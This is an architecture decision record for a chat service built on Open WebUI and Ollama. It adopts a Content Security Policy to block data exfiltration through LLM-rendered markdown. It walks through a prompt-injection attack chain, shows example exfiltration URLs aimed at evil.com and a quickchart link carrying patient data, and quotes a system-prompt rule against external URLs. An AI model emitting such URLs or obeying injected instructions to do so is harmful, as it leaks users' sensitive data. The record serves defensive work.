# ADR 0009: Content Security Policy for Open WebUI Data Exfiltration Prevention

**Date**: 2025-12-12
**Status**: Accepted
**Decision Owner**: TAG Team

## Context

Scout's Chat service (Open WebUI + Ollama) allows users to interact with LLMs via a web interface. A security vulnerability exists where LLM-generated content can exfiltrate sensitive data through the user's browser, even in air-gapped deployments.

### The Attack Vector

NVIDIA's AI Red Team identifies "active content rendering of LLM outputs leading to data exfiltration" as one of their top three most significant findings when assessing AI-powered applications.

The attack works as follows:

1. LLM generates markdown containing external resource URLs with embedded data:
   ```markdown
   ![chart](https://quickchart.io/chart?c={data:[sensitive_patient_data]})
   ```
2. Open WebUI renders this as an HTML image tag
3. User's browser (which has internet access even if the cluster is air-gapped) fetches the URL
4. Sensitive data encoded in URL parameters is sent to the external server

This attack can be triggered through:
- **Prompt injection**: Malicious instructions in user-provided documents or context
- **Model manipulation**: Compromised or malicious model weights
- **Indirect injection**: External data sources containing attack payloads

The exfiltration vector extends beyond images to any browser-initiated request:
- External images (`<img src="...">`)
- External scripts (`<script src="...">`)
- Form submissions (`<form action="...">`)
- Fetch/XHR requests from inline scripts
- Iframes and embedded content

### Why Air-Gapping Doesn't Help

While Scout's cluster may be air-gapped, the user's browser typically has internet access. The browser executes in the user's environment, not the cluster, so network isolation at the cluster level provides no protection against this attack.

## Decision

**Implement a Content Security Policy (CSP) via Traefik middleware to restrict browser resource loading to trusted origins only.**

The CSP header instructs browsers to block requests to unauthorized external domains, preventing data exfiltration regardless of what the LLM generates.

### Implementation

A Traefik middleware injects CSP headers on all Open WebUI responses:

```yaml
apiVersion: traefik.io/v1alpha1
kind: Middleware
metadata:
  name: open-webui-csp
  namespace: open-webui
spec:
  headers:
    contentSecurityPolicy: >-
      default-src 'self';
      script-src 'self' 'unsafe-inline' 'unsafe-eval';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: blob:;
      font-src 'self' data:;
      connect-src 'self' ws: wss: https://keycloak.example.com;
      frame-src 'self';
      form-action 'self' https://keycloak.example.com;
```

The middleware is chained with existing OAuth2 Proxy middlewares via ingress annotations.

### Policy Breakdown

| Directive | Value | Purpose |
|-----------|-------|---------|
| `default-src` | `'self'` | Block all external resources by default |
| `script-src` | `'self' 'unsafe-inline' 'unsafe-eval'` | Allow app scripts (inline required by Open WebUI) |
| `style-src` | `'self' 'unsafe-inline'` | Allow app styles (inline required by Open WebUI) |
| `img-src` | `'self' data: blob:` | Allow app images, data URIs, blobs (user uploads) |
| `font-src` | `'self' data:` | Allow app fonts |
| `connect-src` | `'self' ws: wss: <keycloak>` | Allow API calls, WebSockets, OAuth |
| `frame-src` | `'self'` | Block external iframes |
| `form-action` | `'self' <keycloak>` | Allow forms only to app and OAuth provider |

### Configuration

CSP is enabled by default and can be disabled if needed:

```yaml
# inventory.yaml
open_webui_csp_enabled: false  # Default: true
```

## Alternatives Considered

### Summary

| Alternative | Verdict |
|-------------|---------|
| **1. CSP via Traefik Middleware (Selected)** | **Selected - Browser-enforced, no app changes** |
| 2. LLM-Guard Pipeline | Considered - Defense in depth, but bypassable |
| 3. Output Sanitization in App | Rejected - Requires upstream changes |
| 4. System Prompt Hardening | Rejected - Easily bypassed via prompt injection |
| 5. Network-Level Blocking | Rejected - Browser runs outside cluster network |

### Alternative 1: CSP via Traefik Middleware (Selected)

Inject CSP headers at the ingress layer using Traefik's headers middleware.

**Pros:**
- Browser-enforced security (cannot be bypassed by LLM output)
- No changes required to Open WebUI application
- Consistent with existing Traefik middleware pattern (OAuth2 Proxy)
- Can be enabled/disabled via Ansible variable
- Immediate protection for all response content

**Cons:**
- Requires `'unsafe-inline'` and `'unsafe-eval'` for scripts (Open WebUI limitation)
- Blocks legitimate external API integrations (OpenAI, etc.) if configured
- May break future Open WebUI features that require external resources

**Verdict:** Selected as the primary defense mechanism.

### Alternative 2: LLM-Guard Pipeline

Use Open WebUI's pipeline feature with LLM-Guard to scan and sanitize LLM outputs.

**Pros:**
- Can detect and block various prompt injection attacks
- Provides defense in depth alongside CSP
- Can log/alert on suspicious output patterns

**Cons:**
- Pattern-based detection can be bypassed with encoding or obfuscation
- Adds latency to every response
- Requires maintaining detection rules
- Does not prevent novel exfiltration techniques

**Verdict:** Recommended as additional defense layer, but not sufficient alone.

### Alternative 3: Output Sanitization in Open WebUI

Modify Open WebUI to sanitize LLM outputs before rendering.

**Pros:**
- Could strip all external URLs from output
- Application-level control

**Cons:**
- Requires upstream changes or fork maintenance
- Complex to implement correctly (many encoding bypasses)
- May break legitimate markdown rendering

**Verdict:** Rejected - requires application changes outside our control.

### Alternative 4: System Prompt Hardening

Instruct the LLM via system prompt to never generate external URLs.

**Pros:**
- Simple to implement
- No infrastructure changes

**Cons:**
- Trivially bypassed via prompt injection
- LLM may ignore instructions under adversarial conditions
- Provides false sense of security

**Verdict:** Rejected - not a security control.

### Alternative 5: Network-Level Blocking

Block outbound requests to external domains at the firewall/proxy level.

**Pros:**
- Would work for server-side requests
- Infrastructure-level control

**Cons:**
- User's browser is outside the cluster network
- Cannot block requests originating from user's machine
- Air-gapping the cluster doesn't help

**Verdict:** Rejected - does not address the threat model.

## Rationale

CSP was selected as the primary mitigation for three reasons:

**1. Browser-Enforced Security**

CSP is enforced by the browser itself, not the application. Even if the LLM generates malicious content, the browser will refuse to load external resources. This provides a security boundary that cannot be bypassed by application-layer attacks.

**2. No Application Changes Required**

The mitigation is implemented entirely at the infrastructure layer via Traefik middleware. No changes to Open WebUI are required, avoiding fork maintenance burden and ensuring compatibility with upstream updates.

**3. Consistent Architecture Pattern**

Scout already uses Traefik middlewares for authentication (OAuth2 Proxy). Adding CSP follows the same pattern, keeping security controls centralized at the ingress layer.

## Consequences

### Positive

- Prevents data exfiltration via LLM-generated external resource URLs
- Browser-enforced security cannot be bypassed by LLM output
- No application changes required
- Configurable via standard Ansible variable
- Works even when cluster is air-gapped but user browser has internet

### Negative

- External LLM provider integrations (OpenAI API, etc.) would be blocked by `connect-src`
  - Scout uses local Ollama, so this is not an issue for current deployment
- `'unsafe-inline'` and `'unsafe-eval'` required for scripts reduces CSP effectiveness against XSS
  - This is an Open WebUI limitation, not introduced by this change
- Users cannot embed external images in conversations (intentional restriction)
- Future Open WebUI features requiring external resources may break

### Operational

- CSP violations logged in browser console (useful for debugging)
- Can be disabled via `open_webui_csp_enabled: false` if issues arise
- No performance impact (header added to responses, browser enforces)

## Limitations and Residual Risk

### What CSP Does Not Block

CSP prevents **automatic** resource loading but cannot prevent **user-initiated navigation**. There is no `navigate-to` CSP directive (it was proposed but never implemented by browsers).

| Attack Vector | CSP Blocks? | User Action Required |
|---------------|-------------|----------------------|
| `<img src="https://evil.com/exfil?data=...">` | **Yes** | None (automatic) |
| `<a href="https://evil.com/exfil?data=...">Click</a>` | **No** | User must click |
| `[Link](https://evil.com/exfil?data=...)` markdown | **No** | User must click |

### Residual Risk Assessment

The residual risk (user clicks malicious link) is **lower severity** than the mitigated risk (automatic exfiltration) because:

1. **Requires user action**: User must actively click the link
2. **Visible to user**: Navigation is visible in browser URL bar
3. **Broken image indication**: Blocked images appear broken, signaling something is wrong

However, users may trust LLM-generated links and click without scrutiny, so this risk should not be dismissed entirely.

### Recommended Additional Mitigations

For defense in depth, consider these optional measures:

**1. Output Filter Function (Recommended)**

Install an Open WebUI function to strip or warn on external URLs in LLM responses. The community [Markdown Image Remover](https://openwebui.com/f/violet/markdown_image_remover) function demonstrates this pattern.

**2. System Prompt Guidance (Weak but Helpful)**

Add to Scout model's system prompt:
```
Never generate external URLs, image links, or references to third-party services.
All visualizations should be described in text, not rendered via external services.
```

This is easily bypassed via prompt injection but reduces frequency of external URL generation in normal use.

**3. User Awareness**

Document in user training that users should not click links in chat responses that point to external domains, especially if images appear broken.

## References

- [NVIDIA AI Red Team: Practical LLM Security Advice](https://developer.nvidia.com/blog/practical-llm-security-advice-from-the-nvidia-ai-red-team/)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP: Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
